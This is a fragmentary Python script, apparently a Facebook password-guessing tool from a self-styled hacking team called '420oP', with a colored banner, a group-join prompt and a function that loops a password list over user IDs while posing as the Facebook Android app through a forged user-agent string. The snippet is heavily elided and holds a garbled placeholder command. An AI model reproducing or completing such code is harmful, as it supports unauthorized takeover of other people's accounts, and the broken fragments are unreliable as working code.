...
try:
	...
	os.system( 'python Professor.py')
	
print('[•] JOIN FACEBOOK GROUP')
os.system('Put Link your Facebook,,,,,/')
...
\033[1;37m║\x1b[1;91m          TEAM      :\033[1;31m 420oP \x1b[0m                        ║
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = "Davik/2.1.0 (Linux; U; Android 10.4.4.0.0; SM-434 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei;FBSV/Huawei.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=645,height=678};]"
				li = ['28','29','210']
